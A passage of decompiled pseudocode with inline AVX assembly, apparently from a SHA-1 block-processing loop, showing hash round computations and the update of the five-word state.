        __asm { vpor    xmm0, xmm0, xmm2 }
        v1071 = v1068 ^ (v908 >> 7);
        HIDWORD(v908) = v1069;
        LODWORD(v908) = v1069;
        v1072 = v908 >> 27;
        __asm { vmovdqa xmm2, [esp+0E0h+var_80] }
        v1074 = v1071 & v1069;
        v1075 = v1068 ^ v1071;
        v1076 = v1072 + (v1061 ^ v1067) + DWORD2(v1532) + v1050;
        HIDWORD(v908) = v1076;
        LODWORD(v908) = v1076;
        v1077 = v908 >> 27;
        LODWORD(v908) = v1072;
        HIDWORD(v908) = v1072;
        v1078 = v908 >> 7;
        __asm
        {
          vpalignr xmm3, xmm0, xmm7, 8
          vpxor   xmm1, xmm1, xmm5
        }
        v1081 = v1077 + (v1068 ^ v1074) + HIDWORD(v1532) + v1061;
        HIDWORD(v908) = v1081;
        LODWORD(v908) = v1081;
        v1082 = v908 >> 27;
        __asm
        {
          vpxor   xmm1, xmm1, xmm2
          vmovdqa [esp+0E0h+var_80], xmm5
          vmovdqa xmm5, xmm4
          vpaddd  xmm4, xmm4, xmm0
        }
        LODWORD(v908) = v1077;
        HIDWORD(v908) = v1077;
        v1086 = v908 >> 7;
        __asm { vpxor   xmm1, xmm1, xmm3 }
        v1088 = v1082 + (v1078 ^ v1075 ^ v1076) + v1542 + v1068;
        HIDWORD(v908) = v1088;
        LODWORD(v908) = v1088;
        v1089 = v908 >> 27;
        __asm
        {
          vpsrld  xmm3, xmm1, 1Eh
          vmovdqa [esp+0E0h+var_E0], xmm4
        }
        LODWORD(v908) = v1082;
        HIDWORD(v908) = v1082;
        v1091 = v908 >> 7;
        __asm { vpslld  xmm1, xmm1, 2 }
        v1093 = v1089 + (v1086 ^ v1078 ^ v1081) + DWORD1(v1542) + v1075;
        HIDWORD(v908) = v1093;
        LODWORD(v908) = v1093;
        v1094 = v908 >> 27;
        LODWORD(v908) = v1089;
        HIDWORD(v908) = v1089;
        v1095 = v908 >> 7;
        __asm
        {
          vpor    xmm1, xmm1, xmm3
          vmovdqa xmm3, [esp+0E0h+var_A0]
        }
        v1098 = v1094 + (v1091 ^ v1086 ^ v1088) + DWORD2(v1542) + v1078;
        HIDWORD(v908) = v1098;
        LODWORD(v908) = v1098;
        v1099 = v908 >> 27;
        LODWORD(v908) = v1094;
        HIDWORD(v908) = v1094;
        v1100 = v908 >> 7;
        __asm
        {
          vpalignr xmm4, xmm1, xmm0, 8
          vpxor   xmm2, xmm2, xmm6
        }
        v1103 = v1099 + (v1095 ^ v1091 ^ v1093) + HIDWORD(v1542) + v1086;
        HIDWORD(v908) = v1103;
        LODWORD(v908) = v1103;
        v1104 = v908 >> 27;
        __asm
        {
          vpxor   xmm2, xmm2, xmm3
          vmovdqa [esp+0E0h+var_A0], xmm6
          vmovdqa xmm6, xmmword ptr [esp+80h]
          vpaddd  xmm5, xmm5, xmm1
        }
        LODWORD(v908) = v1099;
        HIDWORD(v908) = v1099;
        v1108 = v908 >> 7;
        __asm { vpxor   xmm2, xmm2, xmm4 }
        v1110 = v1104 + (v1100 ^ v1095 ^ v1098) + v1552 + v1091;
        HIDWORD(v908) = v1110;
        LODWORD(v908) = v1110;
        v1111 = v908 >> 27;
        __asm
        {
          vpsrld  xmm4, xmm2, 1Eh
          vmovdqa [esp+0E0h+var_D0], xmm5
        }
        LODWORD(v908) = v1104;
        HIDWORD(v908) = v1104;
        v1113 = v908 >> 7;
        __asm { vpslld  xmm2, xmm2, 2 }
        v1115 = v1111 + (v1108 ^ v1100 ^ v1103) + DWORD1(v1552) + v1095;
        HIDWORD(v908) = v1115;
        LODWORD(v908) = v1115;
        v1116 = v908 >> 27;
        LODWORD(v908) = v1111;
        HIDWORD(v908) = v1111;
        v1117 = v908 >> 7;
        __asm
        {
          vpor    xmm2, xmm2, xmm4
          vmovdqa xmm4, [esp+0E0h+var_90]
        }
        v1120 = v1116 + (v1113 ^ v1108 ^ v1110) + DWORD2(v1552) + v1100;
        HIDWORD(v908) = v1120;
        LODWORD(v908) = v1120;
        v1121 = v908 >> 27;
        LODWORD(v908) = v1116;
        HIDWORD(v908) = v1116;
        v1122 = v908 >> 7;
        __asm
        {
          vpalignr xmm5, xmm2, xmm1, 8
          vpxor   xmm3, xmm3, xmm7
        }
        v1125 = v1121 + (v1117 ^ v1113 ^ v1115) + HIDWORD(v1552) + v1108;
        HIDWORD(v908) = v1125;
        LODWORD(v908) = v1125;
        v1126 = v908 >> 27;
        __asm
        {
          vpxor   xmm3, xmm3, xmm4
          vmovdqa [esp+0E0h+var_90], xmm7
          vmovdqa xmm7, xmm6
          vpaddd  xmm6, xmm6, xmm2
        }
        LODWORD(v908) = v1121;
        HIDWORD(v908) = v1121;
        v1130 = v908 >> 7;
        __asm { vpxor   xmm3, xmm3, xmm5 }
        v1132 = v1126 + (v1122 ^ v1117 ^ v1120) + v1562 + v1113;
        HIDWORD(v908) = v1132;
        LODWORD(v908) = v1132;
        v1133 = v908 >> 27;
        __asm
        {
          vpsrld  xmm5, xmm3, 1Eh
          vmovdqa [esp+0E0h+var_C0], xmm6
        }
        LODWORD(v908) = v1126;
        HIDWORD(v908) = v1126;
        v1135 = v908 >> 7;
        __asm { vpslld  xmm3, xmm3, 2 }
        v1137 = v1133 + (v1130 ^ v1122 ^ v1125) + DWORD1(v1562) + v1117;
        HIDWORD(v908) = v1137;
        LODWORD(v908) = v1137;
        v1138 = v908 >> 27;
        LODWORD(v908) = v1133;
        HIDWORD(v908) = v1133;
        v1139 = v908 >> 7;
        __asm
        {
          vpor    xmm3, xmm3, xmm5
          vmovdqa xmm5, [esp+0E0h+var_80]
        }
        v1142 = v1138 + (v1135 ^ v1130 ^ v1132) + DWORD2(v1562) + v1122;
        HIDWORD(v908) = v1142;
        LODWORD(v908) = v1142;
        v1143 = v908 >> 27;
        LODWORD(v908) = v1138;
        HIDWORD(v908) = v1138;
        v1144 = v908 >> 7;
        __asm
        {
          vpalignr xmm6, xmm3, xmm2, 8
          vpxor   xmm4, xmm4, xmm0
        }
        v1147 = v1143 + (v1139 ^ v1135 ^ v1137) + HIDWORD(v1562) + v1130;
        HIDWORD(v908) = v1147;
        LODWORD(v908) = v1147;
        v1148 = v908 >> 27;
        __asm
        {
          vpxor   xmm4, xmm4, xmm5
          vmovdqa [esp+0E0h+var_80], xmm0
          vmovdqa xmm0, xmm7
          vpaddd  xmm7, xmm7, xmm3
        }
        LODWORD(v908) = v1143;
        HIDWORD(v908) = v1143;
        v1152 = v908 >> 7;
        __asm { vpxor   xmm4, xmm4, xmm6 }
        v1154 = v1148 + (v1144 ^ v1139 ^ v1142) + v1533 + v1135;
        HIDWORD(v908) = v1154;
        LODWORD(v908) = v1154;
        v1155 = v908 >> 27;
        __asm
        {
          vpsrld  xmm6, xmm4, 1Eh
          vmovdqa [esp+0E0h+var_B0], xmm7
        }
        LODWORD(v908) = v1148;
        HIDWORD(v908) = v1148;
        v1157 = v908 >> 7;
        __asm { vpslld  xmm4, xmm4, 2 }
        v1159 = v1155 + (v1152 ^ v1144 ^ v1147) + DWORD1(v1533) + v1139;
        HIDWORD(v908) = v1159;
        LODWORD(v908) = v1159;
        v1160 = v908 >> 27;
        LODWORD(v908) = v1155;
        HIDWORD(v908) = v1155;
        v1161 = v908 >> 7;
        __asm
        {
          vpor    xmm4, xmm4, xmm6
          vmovdqa xmm6, [esp+0E0h+var_A0]
        }
        v1164 = v1160 + (v1157 ^ v1152 ^ v1154) + DWORD2(v1533) + v1144;
        HIDWORD(v908) = v1164;
        LODWORD(v908) = v1164;
        v1165 = v908 >> 27;
        LODWORD(v908) = v1160;
        HIDWORD(v908) = v1160;
        v1166 = v908 >> 7;
        __asm
        {
          vpalignr xmm7, xmm4, xmm3, 8
          vpxor   xmm5, xmm5, xmm1
        }
        v1169 = v1165 + (v1161 ^ v1157 ^ v1159) + HIDWORD(v1533) + v1152;
        HIDWORD(v908) = v1169;
        LODWORD(v908) = v1169;
        v1170 = v908 >> 27;
        __asm
        {
          vpxor   xmm5, xmm5, xmm6
          vmovdqa [esp+0E0h+var_A0], xmm1
          vmovdqa xmm1, xmm0
          vpaddd  xmm0, xmm0, xmm4
        }
        LODWORD(v908) = v1165;
        HIDWORD(v908) = v1165;
        v1174 = v908 >> 7;
        __asm { vpxor   xmm5, xmm5, xmm7 }
        v1176 = v1170 + (v1166 ^ v1161 ^ v1164) + v1543 + v1157;
        HIDWORD(v908) = v1176;
        LODWORD(v908) = v1176;
        v1177 = v908 >> 27;
        __asm
        {
          vpsrld  xmm7, xmm5, 1Eh
          vmovdqa [esp+0E0h+var_E0], xmm0
        }
        LODWORD(v908) = v1170;
        HIDWORD(v908) = v1170;
        v1179 = v908 >> 7;
        __asm { vpslld  xmm5, xmm5, 2 }
        v1181 = v1177 + (v1174 ^ v1166 ^ v1169) + DWORD1(v1543) + v1161;
        HIDWORD(v908) = v1181;
        LODWORD(v908) = v1181;
        v1182 = v908 >> 27;
        LODWORD(v908) = v1177;
        HIDWORD(v908) = v1177;
        v1183 = v908 >> 7;
        v1184 = v1182 + (v1179 ^ v1174 ^ v1176) + DWORD2(v1543) + v1166;
        __asm
        {
          vpor    xmm5, xmm5, xmm7
          vmovdqa xmm7, [esp+0E0h+var_90]
        }
        LODWORD(v908) = v1182;
        HIDWORD(v908) = v1182;
        v1187 = v908 >> 7;
        v1188 = v1184;
        HIDWORD(v908) = v1184;
        LODWORD(v908) = v1184;
        v1189 = v908 >> 27;
        v1190 = v1187 ^ v1188;
        v1191 = v1183 ^ v1187;
        v1192 = v1189 + (v1183 ^ v1179 ^ v1181) + HIDWORD(v1543) + v1174;
        __asm
        {
          vpalignr xmm0, xmm5, xmm4, 8
          vpxor   xmm6, xmm6, xmm2
        }
        v1195 = v1191 & v1190;
        v1196 = v1183 ^ v1191;
        LODWORD(v908) = v1189;
        HIDWORD(v908) = v1189;
        v1197 = v908 >> 7;
        __asm
        {
          vpxor   xmm6, xmm6, xmm7
          vmovdqa [esp+0E0h+var_90], xmm2
        }
        v1199 = v1192;
        __asm
        {
          vmovdqa xmm2, xmm1
          vpaddd  xmm1, xmm1, xmm5
        }
        HIDWORD(v908) = v1192;
        LODWORD(v908) = v1192;
        v1202 = v908 >> 27;
        __asm { vpxor   xmm6, xmm6, xmm0 }
        v1204 = v1197 ^ v1199;
        v1205 = v1196 ^ v1197;
        v1206 = v1202 + (v1196 ^ v1195) + v1553 + v1179;
        __asm
        {
          vpsrld  xmm0, xmm6, 1Eh
          vmovdqa [esp+0E0h+var_D0], xmm1
        }
        v1208 = v1205 & v1204;
        v1209 = v1196 ^ v1205;
        LODWORD(v908) = v1202;
        HIDWORD(v908) = v1202;
        v1210 = v908 >> 7;
        v1211 = v1206;
        __asm { vpslld  xmm6, xmm6, 2 }
        HIDWORD(v908) = v1206;
        LODWORD(v908) = v1206;
        v1213 = v908 >> 27;
        v1214 = v1210 ^ v1211;
        v1215 = v1209 ^ v1210;
        v1216 = v1213 + (v1209 ^ v1208) + DWORD1(v1553) + v1183;
        v1217 = v1215 & v1214;
        __asm { vpor    xmm6, xmm6, xmm0 }
        v1219 = v1209 ^ v1215;
        LODWORD(v908) = v1213;
        HIDWORD(v908) = v1213;
        v1220 = v908 >> 7;
        __asm { vmovdqa xmm0, [esp+0E0h+var_80] }
        v1222 = v1216;
        HIDWORD(v908) = v1216;
        LODWORD(v908) = v1216;
        v1223 = v908 >> 27;
        v1224 = v1220 ^ v1222;
        v1225 = v1219 ^ v1220;
        v1226 = v1223 + (v1219 ^ v1217) + DWORD2(v1553) + v1196;
        v1227 = v1225 & v1224;
        v1228 = v1219 ^ v1225;
        LODWORD(v908) = v1223;
        HIDWORD(v908) = v1223;
        v1229 = v908 >> 7;
        v1230 = v1226;
        HIDWORD(v908) = v1226;
        LODWORD(v908) = v1226;
        v1231 = v908 >> 27;
        v1232 = v1229 ^ v1230;
        v1233 = v1228 ^ v1229;
        v1234 = v1231 + (v1228 ^ v1227) + HIDWORD(v1553) + v1209;
        __asm
        {
          vpalignr xmm1, xmm6, xmm5, 8
          vpxor   xmm7, xmm7, xmm3
        }
        v1237 = v1233 & v1232;
        v1238 = v1228 ^ v1233;
        LODWORD(v908) = v1231;
        HIDWORD(v908) = v1231;
        v1239 = v908 >> 7;
        __asm
        {
          vpxor   xmm7, xmm7, xmm0
          vmovdqa [esp+0E0h+var_80], xmm3
        }
        v1241 = v1234;
        __asm
        {
          vmovdqa xmm3, [esp+0E0h+var_50]
          vpaddd  xmm2, xmm2, xmm6
        }
        HIDWORD(v908) = v1234;
        LODWORD(v908) = v1234;
        v1244 = v908 >> 27;
        __asm { vpxor   xmm7, xmm7, xmm1 }
        v1246 = v1239 ^ v1241;
        v1247 = v1238 ^ v1239;
        v1248 = v1244 + (v1238 ^ v1237) + v1563 + v1219;
        __asm
        {
          vpsrld  xmm1, xmm7, 1Eh
          vmovdqa [esp+0E0h+var_C0], xmm2
        }
        v1250 = v1247 & v1246;
        v1251 = v1238 ^ v1247;
        LODWORD(v908) = v1244;
        HIDWORD(v908) = v1244;
        v1252 = v908 >> 7;
        v1253 = v1248;
        __asm { vpslld  xmm7, xmm7, 2 }
        HIDWORD(v908) = v1248;
        LODWORD(v908) = v1248;
        v1255 = v908 >> 27;
        v1256 = v1252 ^ v1253;
        v1257 = v1251 ^ v1252;
        v1258 = v1255 + (v1251 ^ v1250) + DWORD1(v1563) + v1228;
        v1259 = v1257 & v1256;
        __asm { vpor    xmm7, xmm7, xmm1 }
        v1261 = v1251 ^ v1257;
        LODWORD(v908) = v1255;
        HIDWORD(v908) = v1255;
        v1262 = v908 >> 7;
        __asm { vmovdqa xmm1, [esp+0E0h+var_A0] }
        v1264 = v1258;
        HIDWORD(v908) = v1258;
        LODWORD(v908) = v1258;
        v1265 = v908 >> 27;
        v1266 = v1262 ^ v1264;
        v1267 = v1261 ^ v1262;
        v1268 = v1265 + (v1261 ^ v1259) + DWORD2(v1563) + v1238;
        v1269 = v1267 & v1266;
        v1270 = v1261 ^ v1267;
        LODWORD(v908) = v1265;
        HIDWORD(v908) = v1265;
        v1271 = v908 >> 7;
        v1272 = v1268;
        HIDWORD(v908) = v1268;
        LODWORD(v908) = v1268;
        v1273 = v908 >> 27;
        v1274 = v1271 ^ v1272;
        v1275 = v1270 ^ v1271;
        v1276 = v1273 + (v1270 ^ v1269) + HIDWORD(v1563) + v1251;
        __asm
        {
          vpalignr xmm2, xmm7, xmm6, 8
          vpxor   xmm0, xmm0, xmm4
        }
        v1279 = v1275 & v1274;
        v1280 = v1270 ^ v1275;
        LODWORD(v908) = v1273;
        HIDWORD(v908) = v1273;
        v1281 = v908 >> 7;
        __asm
        {
          vpxor   xmm0, xmm0, xmm1
          vmovdqa [esp+0E0h+var_A0], xmm4
        }
        v1283 = v1276;
        __asm
        {
          vmovdqa xmm4, xmm3
          vpaddd  xmm3, xmm3, xmm7
        }
        HIDWORD(v908) = v1276;
        LODWORD(v908) = v1276;
        v1286 = v908 >> 27;
        __asm { vpxor   xmm0, xmm0, xmm2 }
        v1288 = v1281 ^ v1283;
        v1289 = v1280 ^ v1281;
        v1290 = v1286 + (v1280 ^ v1279) + v1534 + v1261;
        __asm
        {
          vpsrld  xmm2, xmm0, 1Eh
          vmovdqa [esp+0E0h+var_B0], xmm3
        }
        v1292 = v1289 & v1288;
        v1293 = v1280 ^ v1289;
        LODWORD(v908) = v1286;
        HIDWORD(v908) = v1286;
        v1294 = v908 >> 7;
        v1295 = v1290;
        __asm { vpslld  xmm0, xmm0, 2 }
        HIDWORD(v908) = v1290;
        LODWORD(v908) = v1290;
        v1297 = v908 >> 27;
        v1298 = v1294 ^ v1295;
        v1299 = v1293 ^ v1294;
        v1300 = v1297 + (v1293 ^ v1292) + DWORD1(v1534) + v1270;
        v1301 = v1299 & v1298;
        __asm { vpor    xmm0, xmm0, xmm2 }
        v1303 = v1293 ^ v1299;
        LODWORD(v908) = v1297;
        HIDWORD(v908) = v1297;
        v1304 = v908 >> 7;
        __asm { vmovdqa xmm2, [esp+0E0h+var_90] }
        v1306 = v1300;
        HIDWORD(v908) = v1300;
        LODWORD(v908) = v1300;
        v1307 = v908 >> 27;
        v1308 = v1304 ^ v1306;
        v1309 = v1303 ^ v1304;
        v1310 = v1307 + (v1303 ^ v1301) + DWORD2(v1534) + v1280;
        v1311 = v1309 & v1308;
        v1312 = v1303 ^ v1309;
        LODWORD(v908) = v1307;
        HIDWORD(v908) = v1307;
        v1313 = v908 >> 7;
        v1314 = v1310;
        HIDWORD(v908) = v1310;
        LODWORD(v908) = v1310;
        v1315 = v908 >> 27;
        v1316 = v1313 ^ v1314;
        v1317 = v1312 ^ v1313;
        v1318 = v1315 + (v1312 ^ v1311) + HIDWORD(v1534) + v1293;
        __asm
        {
          vpalignr xmm3, xmm0, xmm7, 8
          vpxor   xmm1, xmm1, xmm5
        }
        v1321 = v1317 & v1316;
        v1322 = v1312 ^ v1317;
        LODWORD(v908) = v1315;
        HIDWORD(v908) = v1315;
        v1323 = v908 >> 7;
        __asm
        {
          vpxor   xmm1, xmm1, xmm2
          vmovdqa [esp+0E0h+var_90], xmm5
        }
        v1325 = v1318;
        __asm
        {
          vmovdqa xmm5, xmm4
          vpaddd  xmm4, xmm4, xmm0
        }
        HIDWORD(v908) = v1318;
        LODWORD(v908) = v1318;
        v1328 = v908 >> 27;
        __asm { vpxor   xmm1, xmm1, xmm3 }
        v1330 = v1323 ^ v1325;
        v1331 = v1322 ^ v1323;
        v1332 = v1328 + (v1322 ^ v1321) + v1544 + v1303;
        __asm
        {
          vpsrld  xmm3, xmm1, 1Eh
          vmovdqa [esp+0E0h+var_E0], xmm4
        }
        v1334 = v1331 & v1330;
        v1335 = v1322 ^ v1331;
        LODWORD(v908) = v1328;
        HIDWORD(v908) = v1328;
        v1336 = v908 >> 7;
        v1337 = v1332;
        __asm { vpslld  xmm1, xmm1, 2 }
        HIDWORD(v908) = v1332;
        LODWORD(v908) = v1332;
        v1339 = v908 >> 27;
        v1340 = v1336 ^ v1337;
        v1341 = v1335 ^ v1336;
        v1342 = v1339 + (v1335 ^ v1334) + DWORD1(v1544) + v1312;
        v1343 = v1341 & v1340;
        __asm { vpor    xmm1, xmm1, xmm3 }
        v1345 = v1335 ^ v1341;
        LODWORD(v908) = v1339;
        HIDWORD(v908) = v1339;
        v1346 = v908 >> 7;
        __asm { vmovdqa xmm3, [esp+0E0h+var_80] }
        v1348 = v1342;
        HIDWORD(v908) = v1342;
        LODWORD(v908) = v1342;
        v1349 = v908 >> 27;
        v1350 = v1346 ^ v1348;
        v1351 = v1345 ^ v1346;
        v1352 = v1349 + (v1345 ^ v1343) + DWORD2(v1544) + v1322;
        v1353 = v1351 & v1350;
        v1354 = v1345 ^ v1351;
        LODWORD(v908) = v1349;
        HIDWORD(v908) = v1349;
        v1355 = v908 >> 7;
        v1356 = v1352;
        HIDWORD(v908) = v1352;
        LODWORD(v908) = v1352;
        v1357 = v908 >> 27;
        v1358 = v1355 ^ v1356;
        v1359 = v1354 ^ v1355;
        v1360 = v1357 + (v1354 ^ v1353) + HIDWORD(v1544) + v1335;
        __asm
        {
          vpalignr xmm4, xmm1, xmm0, 8
          vpxor   xmm2, xmm2, xmm6
        }
        v1363 = v1359 & v1358;
        v1364 = v1354 ^ v1359;
        LODWORD(v908) = v1357;
        HIDWORD(v908) = v1357;
        v1365 = v908 >> 7;
        __asm
        {
          vpxor   xmm2, xmm2, xmm3
          vmovdqa [esp+0E0h+var_80], xmm6
        }
        v1367 = v1360;
        __asm
        {
          vmovdqa xmm6, xmm5
          vpaddd  xmm5, xmm5, xmm1
        }
        HIDWORD(v908) = v1360;
        LODWORD(v908) = v1360;
        v1370 = v908 >> 27;
        __asm { vpxor   xmm2, xmm2, xmm4 }
        v1372 = v1365 ^ v1367;
        v1373 = v1364 ^ v1365;
        v1374 = v1370 + (v1364 ^ v1363) + v1554 + v1345;
        __asm
        {
          vpsrld  xmm4, xmm2, 1Eh
          vmovdqa [esp+0E0h+var_D0], xmm5
        }
        v1376 = v1373 & v1372;
        v1377 = v1364 ^ v1373;
        LODWORD(v908) = v1370;
        HIDWORD(v908) = v1370;
        v1378 = v908 >> 7;
        v1379 = v1374;
        __asm { vpslld  xmm2, xmm2, 2 }
        HIDWORD(v908) = v1374;
        LODWORD(v908) = v1374;
        v1381 = v908 >> 27;
        v1382 = v1378 ^ v1379;
        v1383 = v1377 ^ v1378;
        v1384 = v1381 + (v1377 ^ v1376) + DWORD1(v1554) + v1354;
        v1385 = v1383 & v1382;
        __asm { vpor    xmm2, xmm2, xmm4 }
        v1387 = v1377 ^ v1383;
        LODWORD(v908) = v1381;
        HIDWORD(v908) = v1381;
        v1388 = v908 >> 7;
        __asm { vmovdqa xmm4, [esp+0E0h+var_A0] }
        v1390 = v1384;
        HIDWORD(v908) = v1384;
        LODWORD(v908) = v1384;
        v1391 = v908 >> 27;
        v1392 = v1388 ^ v1390;
        v1393 = v1387 ^ v1388;
        v1394 = v1391 + (v1387 ^ v1385) + DWORD2(v1554) + v1364;
        v1395 = v1393 & v1392;
        v1396 = v1387 ^ v1393;
        LODWORD(v908) = v1391;
        HIDWORD(v908) = v1391;
        v1397 = v908 >> 7;
        v1398 = v1394;
        HIDWORD(v908) = v1394;
        LODWORD(v908) = v1394;
        v1399 = v908 >> 27;
        __asm
        {
          vpalignr xmm5, xmm2, xmm1, 8
          vpxor   xmm3, xmm3, xmm7
        }
        v1402 = v1399 + (v1396 ^ v1395) + HIDWORD(v1554) + v1377;
        HIDWORD(v908) = v1402;
        LODWORD(v908) = v1402;
        v1403 = v908 >> 27;
        __asm
        {
          vpxor   xmm3, xmm3, xmm4
          vmovdqa [esp+0E0h+var_A0], xmm7
          vmovdqa xmm7, xmm6
          vpaddd  xmm6, xmm6, xmm2
        }
        LODWORD(v908) = v1399;
        HIDWORD(v908) = v1399;
        v1407 = v908 >> 7;
        __asm { vpxor   xmm3, xmm3, xmm5 }
        v1409 = v1403 + (v1397 ^ v1396 ^ v1398) + v1564 + v1387;
        HIDWORD(v908) = v1409;
        LODWORD(v908) = v1409;
        v1410 = v908 >> 27;
        __asm
        {
          vpsrld  xmm5, xmm3, 1Eh
          vmovdqa [esp+0E0h+var_C0], xmm6
        }
        LODWORD(v908) = v1403;
        HIDWORD(v908) = v1403;
        v1412 = v908 >> 7;
        __asm { vpslld  xmm3, xmm3, 2 }
        v1414 = v1410 + (v1407 ^ v1397 ^ v1402) + DWORD1(v1564) + v1396;
        HIDWORD(v908) = v1414;
        LODWORD(v908) = v1414;
        v1415 = v908 >> 27;
        LODWORD(v908) = v1410;
        HIDWORD(v908) = v1410;
        v1416 = v908 >> 7;
        __asm { vpor    xmm3, xmm3, xmm5 }
        v1418 = v1415 + (v1412 ^ v1407 ^ v1409) + DWORD2(v1564) + v1397;
        HIDWORD(v908) = v1418;
        LODWORD(v908) = v1418;
        v1419 = v908 >> 27;
        LODWORD(v908) = v1415;
        HIDWORD(v908) = v1415;
        v1420 = v908 >> 7;
        __asm { vpaddd  xmm7, xmm7, xmm3 }
        v1422 = v1419 + (v1416 ^ v1412 ^ v1414) + HIDWORD(v1564) + v1407;
        HIDWORD(v908) = v1422;
        LODWORD(v908) = v1422;
        v1423 = v908 >> 27;
        __asm { vmovdqa [esp+0E0h+var_B0], xmm7 }
        LODWORD(v908) = v1419;
        HIDWORD(v908) = v1419;
        v1424 = v908 >> 7;
        v1425 = v1423 + (v1420 ^ v1416 ^ v1418) + v1535 + v1412;
        HIDWORD(v908) = v1425;
        LODWORD(v908) = v1425;
        v1426 = v908 >> 27;
        LODWORD(v908) = v1423;
        HIDWORD(v908) = v1423;
        v1427 = v908 >> 7;
        v1428 = v1426 + (v1424 ^ v1420 ^ v1422) + DWORD1(v1535) + v1416;
        HIDWORD(v908) = v1428;
        LODWORD(v908) = v1428;
        v1429 = v908 >> 27;
        LODWORD(v908) = v1426;
        HIDWORD(v908) = v1426;
        v1430 = v908 >> 7;
        HIDWORD(v908) = v1429 + (v1427 ^ v1424 ^ v1425) + DWORD2(v1535) + v1420;
        LODWORD(v908) = HIDWORD(v908);
        v1431 = v908 >> 27;
        v1432 = v1430 ^ HIDWORD(v908);
        LODWORD(v908) = v1429;
        HIDWORD(v908) = v1429;
        v1433 = v908 >> 7;
        v1434 = v1431 + (v1430 ^ v1427 ^ v1428) + HIDWORD(v1535) + v1424;
        _EBP = v1574.m128i_i32[1];
        if ( v1574.m128i_i32[1] == v1574.m128i_i32[2] )
          break;
        __asm
        {
          vmovdqa xmm7, [esp+0E0h+var_40]
          vmovdqa xmm6, [esp+0E0h+var_30]
          vmovdqu xmm0, xmmword ptr [ebp+0]
          vmovdqu xmm1, xmmword ptr [ebp+10h]
          vmovdqu xmm2, xmmword ptr [ebp+20h]
          vmovdqu xmm3, xmmword ptr [ebp+30h]
          vpshufb xmm0, xmm0, xmm6
        }
        v1574.m128i_i32[1] += 64;
        __asm
        {
          vmovdqa [esp+0E0h+var_80], xmm7
          vpshufb xmm1, xmm1, xmm6
        }
        v1441 = v1434;
        HIDWORD(v1443) = v1434;
        LODWORD(v1443) = v1434;
        v1442 = v1443 >> 27;
        __asm { vpaddd  xmm4, xmm0, xmm7 }
        LODWORD(v1443) = v1431;
        HIDWORD(v1443) = v1431;
        v1445 = v1443 >> 7;
        __asm { vmovdqa [esp+0E0h+var_E0], xmm4 }
        v1446 = v1442 + (v1433 ^ v1432) + v1545 + v1427;
        HIDWORD(v1443) = v1446;
        LODWORD(v1443) = v1446;
        v1447 = v1443 >> 27;
        LODWORD(v1443) = v1442;
        HIDWORD(v1443) = v1442;
        v1448 = v1443 >> 7;
        v1449 = v1447 + (v1445 ^ v1433 ^ v1441) + DWORD1(v1545) + v1430;
        HIDWORD(v1443) = v1449;
        LODWORD(v1443) = v1449;
        v1450 = v1443 >> 27;
        LODWORD(v1443) = v1447;
        HIDWORD(v1443) = v1447;
        v1451 = v1443 >> 7;
        v1452 = v1450 + (v1448 ^ v1445 ^ v1446) + DWORD2(v1545) + v1433;
        HIDWORD(v1443) = v1452;
        LODWORD(v1443) = v1452;
        v1453 = v1443 >> 27;
        LODWORD(v1443) = v1450;
        HIDWORD(v1443) = v1450;
        v1454 = v1443 >> 7;
        __asm { vpshufb xmm2, xmm2, xmm6 }
        v1455 = v1453 + (v1451 ^ v1448 ^ v1449) + HIDWORD(v1545) + v1445;
        HIDWORD(v1443) = v1455;
        LODWORD(v1443) = v1455;
        v1456 = v1443 >> 27;
        __asm { vpaddd  xmm5, xmm1, xmm7 }
        LODWORD(v1443) = v1453;
        HIDWORD(v1443) = v1453;
        v1458 = v1443 >> 7;
        __asm { vmovdqa [esp+0E0h+var_D0], xmm5 }
        v1459 = v1456 + (v1454 ^ v1451 ^ v1452) + v1555 + v1448;
        HIDWORD(v1443) = v1459;
        LODWORD(v1443) = v1459;
        v1460 = v1443 >> 27;
        LODWORD(v1443) = v1456;
        HIDWORD(v1443) = v1456;
        v1461 = v1443 >> 7;
        v1462 = v1460 + (v1458 ^ v1454 ^ v1455) + DWORD1(v1555) + v1451;
        HIDWORD(v1443) = v1462;
        LODWORD(v1443) = v1462;
        v1463 = v1443 >> 27;
        LODWORD(v1443) = v1460;
        HIDWORD(v1443) = v1460;
        v1464 = v1443 >> 7;
        v1465 = v1463 + (v1461 ^ v1458 ^ v1459) + DWORD2(v1555) + v1454;
        HIDWORD(v1443) = v1465;
        LODWORD(v1443) = v1465;
        v1466 = v1443 >> 27;
        LODWORD(v1443) = v1463;
        HIDWORD(v1443) = v1463;
        v1467 = v1443 >> 7;
        __asm { vpshufb xmm3, xmm3, xmm6 }
        v1468 = v1466 + (v1464 ^ v1461 ^ v1462) + HIDWORD(v1555) + v1458;
        HIDWORD(v1443) = v1468;
        LODWORD(v1443) = v1468;
        v1469 = v1443 >> 27;
        __asm { vpaddd  xmm6, xmm2, xmm7 }
        LODWORD(v1443) = v1466;
        HIDWORD(v1443) = v1466;
        v1471 = v1443 >> 7;
        __asm { vmovdqa [esp+0E0h+var_C0], xmm6 }
        v1472 = v1469 + (v1467 ^ v1464 ^ v1465) + v1565 + v1461;
        HIDWORD(v1443) = v1472;
        LODWORD(v1443) = v1472;
        v1473 = v1443 >> 27;
        LODWORD(v1443) = v1469;
        HIDWORD(v1443) = v1469;
        v1474 = v1443 >> 7;
        v1475 = v1473 + (v1471 ^ v1467 ^ v1468) + DWORD1(v1565) + v1464;
        HIDWORD(v1443) = v1475;
        LODWORD(v1443) = v1475;
        v1476 = v1443 >> 27;
        LODWORD(v1443) = v1473;
        HIDWORD(v1443) = v1473;
        v1477 = v1443 >> 7;
        v1478 = v1476 + (v1474 ^ v1471 ^ v1472) + DWORD2(v1565) + v1467;
        HIDWORD(v1443) = v1478;
        LODWORD(v1443) = v1478;
        v1479 = v1443 >> 27;
        LODWORD(v1443) = v1476;
        HIDWORD(v1443) = v1476;
        v1480 = v1479 + (v1477 ^ v1474 ^ v1475) + HIDWORD(v1565) + v1471;
        v1481 = (_DWORD *)v1574.m128i_i32[0];
        v891 = *(_DWORD *)v1574.m128i_i32[0] + v1480;
        v1482 = *(_DWORD *)(v1574.m128i_i32[0] + 4) + v1478;
        v893 = *(_DWORD *)(v1574.m128i_i32[0] + 8) + (v1443 >> 7);
        *(_DWORD *)v1574.m128i_i32[0] = v891;
        v894 = v1481[3] + v1477;
        v1481[1] = v1482;
        v895 = v1481[4] + v1474;
        v1481[2] = v893;
        v1481[3] = v894;
        v1481[4] = v895;
        v1483 = v1482;
        v907 = (v894 ^ v893) & v1482;
        v892 = v1483;
      }
      v1484 = v1434;
      HIDWORD(v1486) = v1434;
      LODWORD(v1486) = v1434;
      v1485 = v1486 >> 27;
      LODWORD(v1486) = v1431;
